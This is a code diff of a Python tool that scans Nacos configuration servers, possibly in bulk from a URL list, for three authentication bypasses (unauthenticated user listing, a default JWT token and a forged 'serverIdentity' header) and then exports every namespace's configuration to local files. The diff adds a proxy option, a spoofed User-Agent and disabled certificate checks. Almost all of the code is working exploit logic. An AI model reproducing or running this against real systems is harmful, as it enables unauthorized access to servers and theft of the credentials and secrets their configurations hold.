@@ -3,6 +3,9 @@ import requests
 import json
 import argparse
 from urllib.parse import urlparse
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 def print_banner():
     banner = """
@@ -15,23 +18,27 @@ def print_banner():
     """
     print(banner)
 
-def initial_url_check(target,timeout):
+
+def initial_url_check(target, proxy, timeout):
+    proxies = {"http": proxy, "https": proxy}
+    headers = {"User-Agent": "Nacos-Server"}
     url = f"{target}/nacos/v1/console/server/state"
     session = requests.Session()
     try:
-        response = session.get(url, timeout=timeout)
-        if response.status_code == 404:
-            print(f"[-]{target} 404")
-            return False
-        elif response.status_code == 200:
+        response = session.get(url, timeout=timeout, headers=headers, verify=False, proxies=proxies)
+        if response.status_code == 200:
             return True
+        else:
+            print(f"[-]{target} {response.status_code}")
+            return False
     except requests.exceptions.Timeout:
         print(f"[-]{target} timeout")
         return False
     except requests.exceptions.RequestException as e:
-        print(f"Error: Initial /nacos endpoint request failed for {base_url}: {e}")
+        print(
+            f"Error: Initial /nacos endpoint request failed for {target}: {e}")
         return False
-    return False
+
 
 class NacosAuthChecker:
     def __init__(self, base_url, proxy, timeout=3):
@@ -46,39 +53,46 @@ class NacosAuthChecker:
     def check_unauthorized_access(self):
         url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&search=accurate"
         try:
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
+            response = self.session.get(
+                url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
             if response.status_code == 200:
                 return True
         except requests.exceptions.Timeout:
             print(f"{self.base_url} Unauthorized access check request timed out for.")
         except requests.exceptions.RequestException as e:
-            print(f"Unauthorized access check request failed for {self.base_url}: {e}")
+            print(
+                f"Unauthorized access check request failed for {self.base_url}: {e}")
         return False
 
     def check_default_jwt_token(self):
         url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&search=accurate&accessToken={self.token}"
         self.headers['Authorization'] = self.token
         try:
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
+            response = self.session.get(
+                url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
             if response.status_code == 200:
                 return True
         except requests.exceptions.Timeout:
             print(f"{self.base_url} Default JWT token check request timed out for.")
         except requests.exceptions.RequestException as e:
-            print(f"Default JWT token check request failed for {self.base_url}: {e}")
+            print(
+                f"Default JWT token check request failed for {self.base_url}: {e}")
         return False
 
     def check_server_identity_bypass(self):
         url = f"{self.base_url}/nacos/v1/auth/users?pageNo=1&pageSize=100&accessToken=&search=accurate"
-        self.headers['serverIdentity']= "security"
+        self.headers['serverIdentity'] = "security"
         try:
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
+            response = self.session.get(
+                url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
             if response.status_code == 200:
                 return True
         except requests.exceptions.Timeout:
-            print(f"{self.base_url} Server identity bypass check request timed out for.")
+            print(
+                f"{self.base_url} Server identity bypass check request timed out for.")
         except requests.exceptions.RequestException as e:
-            print(f"Server identity bypass check request failed for {self.base_url}: {e}")
+            print(
+                f"Server identity bypass check request failed for {self.base_url}: {e}")
         return False
 
     def run(self):
@@ -104,7 +118,8 @@ class NacosConfigExporter:
     def get_all_namespaces(self):
         url = f"{self.base_url}/nacos/v1/console/namespaces"
         try:
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
+            response = self.session.get(
+                url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
             if response.status_code == 200:
                 namespaces = response.json().get('data', [])
                 return namespaces
@@ -119,39 +134,46 @@ class NacosConfigExporter:
     def export_all_configs(self):
         namespaces = self.get_all_namespaces()
 
-        base_url_host = "./results/"+urlparse(self.base_url).netloc.replace(":", "_")
+        base_url_host = "./results/" + \
+            urlparse(self.base_url).netloc.replace(":", "_")
         os.makedirs(base_url_host, exist_ok=True)
-        
+
         for namespace in namespaces:
-            namespace_dir = os.path.join(base_url_host, namespace['namespaceShowName'])
+            namespace_dir = os.path.join(
+                base_url_host, namespace['namespaceShowName'])
             os.makedirs(namespace_dir, exist_ok=True)
 
             url = (f"{self.base_url}/nacos/v1/cs/configs?pageNo=1&pageSize=100"
                    f"&search=accurate&dataId=&group=&tenant={namespace['namespace']}&accessToken={self.token}&username={self.username}")
             try:
-                response = self.session.get(url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
+                response = self.session.get(
+                    url, headers=self.headers, proxies=self.proxies, timeout=self.timeout)
                 if response.status_code == 200:
                     configs = response.json().get('pageItems', [])
                     for config in configs:
                         content = config.get("content", "")
                         if content:
-                            file_path = os.path.join(namespace_dir, f"{config['dataId']}.txt")
+                            file_path = os.path.join(
+                                namespace_dir, f"{config['dataId']}.txt")
                             with open(file_path, "w", encoding="utf-8") as f:
                                 f.write(content)
                 else:
-                    print(f"导出 namespace {namespace['namespace']} 的配置失败 for {self.base_url}")
+                    print(
+                        f"导出 namespace {namespace['namespace']} 的配置失败 for {self.base_url}")
             except requests.exceptions.Timeout:
-                print(f"导出 namespace {namespace['namespace']} 的配置请求超时 for {self.base_url}")
+                print(
+                    f"导出 namespace {namespace['namespace']} 的配置请求超时 for {self.base_url}")
             except requests.exceptions.RequestException as e:
-                print(f"导出 namespace {namespace['namespace']} 的配置请求失败 for {self.base_url}: {e}")
-        
+                print(
+                    f"导出 namespace {namespace['namespace']} 的配置请求失败 for {self.base_url}: {e}")
+
         print(f"[+]Save to {os.path.abspath(base_url_host)}")
 
 
 def process_base_url(base_url, proxy, timeout):
     if base_url[-len(base_url):] == '/':
         base_url = base_url[:-1]
-    if initial_url_check(base_url,timeout):
+    if initial_url_check(base_url, proxy, timeout):
         # 获取权限
         auth_checker = NacosAuthChecker(base_url, proxy, timeout)
         auth_result = auth_checker.run()
@@ -159,11 +181,14 @@ def process_base_url(base_url, proxy, timeout):
             print(f"[+]{base_url} Found Vuln {auth_result}")
             # 导出配置
             if auth_result == "unauthorized_access":
-                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, "", auth_checker.username, auth_checker.headers, timeout)
+                config_exporter = NacosConfigExporter(
+                    base_url, auth_checker.session, auth_checker.proxies, "", auth_checker.username, auth_checker.headers, timeout)
             elif auth_result == "default_jwt":
-                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, auth_checker.token, auth_checker.username, auth_checker.headers, timeout)
+                config_exporter = NacosConfigExporter(
+                    base_url, auth_checker.session, auth_checker.proxies, auth_checker.token, auth_checker.username, auth_checker.headers, timeout)
             elif auth_result == "server_identity_bypass":
-                config_exporter = NacosConfigExporter(base_url, auth_checker.session, auth_checker.proxies, auth_checker.token, auth_checker.username, auth_checker.headers, timeout)
+                config_exporter = NacosConfigExporter(
+                    base_url, auth_checker.session, auth_checker.proxies, auth_checker.token, auth_checker.username, auth_checker.headers, timeout)
             config_exporter.export_all_configs()
         else:
             print(f"{base_url} Not Found Vuln")
@@ -174,15 +199,17 @@ def process_base_url(base_url, proxy, timeout):
 if __name__ == "__main__":
     print_banner()
     parser = argparse.ArgumentParser(description="Nacos Config Exporter")
-    parser.add_argument("-t","--target", help="Base URL of the Nacos server")
-    parser.add_argument("-f", "--file", help="File containing list of base URLs")
-    parser.add_argument("--proxy", help="Proxy server (eg: http://127.0.0.1:8080)")
-    parser.add_argument("--timeout", type=int, default=3, help="Request timeout in seconds (default: 3)")
+    parser.add_argument("-t", "--target", help="Base URL of the Nacos server")
+    parser.add_argument(
+        "-f", "--file", help="File containing list of base URLs")
+    parser.add_argument(
+        "--proxy", help="Proxy server (eg: http://127.0.0.1:8080)")
+    parser.add_argument("--timeout", type=int, default=3,
+                        help="Request timeout in seconds (default: 3)")
     args = parser.parse_args()
-    
+
     proxy = args.proxy
     timeout = args.timeout
-
     if args.file:
         with open(args.file, "r") as file:
             base_urls = [line.strip() for line in file if line.strip()]
